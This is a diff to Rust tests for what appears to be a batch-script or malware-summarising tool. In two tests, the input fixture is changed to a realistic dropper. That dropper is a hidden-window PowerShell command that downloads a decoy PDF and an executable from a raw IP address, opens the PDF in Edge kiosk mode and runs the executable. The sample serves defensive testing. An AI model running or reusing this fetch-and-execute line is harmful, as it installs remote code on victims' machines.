@@ -1038,7 +1038,7 @@ fn summarize_dedupes_repeated_powershell_samples_without_changing_count() {
     let input = dir.path().join("in.bat");
     fs::write(
         &input,
-        "powershell -Command \"Start-Process 'msedge.exe' -ArgumentList \\\"--kiosk $env:temp\\readme.pdf\\\"\"\r\n",
+        "@echo off\r\npowershell -WindowStyle Hidden -Command ^\r\n    \"IWR -Uri \"http://95.169.201.100:18960/uploads/team-3/readme.pdf\" -OutFile \"$env:temp\\readme.pdf\" ;  Start-Process 'msedge.exe' -ArgumentList \\\"--kiosk $env:temp\\readme.pdf\\\" ; IWR -Uri \"http://95.169.201.100:18960/uploads/team-3/readme.exe\" -OutFile \"$env:temp\\readme.exe\" ; start \"$env:temp\\readme.exe\"\"\r\nexit",
     )
     .expect("write input");
 
@@ -4900,7 +4900,7 @@ fn summarize_lolbas_enrichment_dedupes_escaped_and_normalized_powershell_targets
     let input = dir.path().join("in.bat");
     fs::write(
         &input,
-        "powershell -Command \"Start-Process 'msedge.exe' -ArgumentList \\\"--kiosk $env:temp\\readme.pdf\\\"\"\r\n",
+        "@echo off\r\npowershell -WindowStyle Hidden -Command ^\r\n    \"IWR -Uri \"http://95.169.201.100:18960/uploads/team-3/readme.pdf\" -OutFile \"$env:temp\\readme.pdf\" ;  Start-Process 'msedge.exe' -ArgumentList \\\"--kiosk $env:temp\\readme.pdf\\\" ; IWR -Uri \"http://95.169.201.100:18960/uploads/team-3/readme.exe\" -OutFile \"$env:temp\\readme.exe\" ; start \"$env:temp\\readme.exe\"\"\r\nexit",
     )
     .expect("write input");
     let lolbas = dir.path().join("lolbas.json");
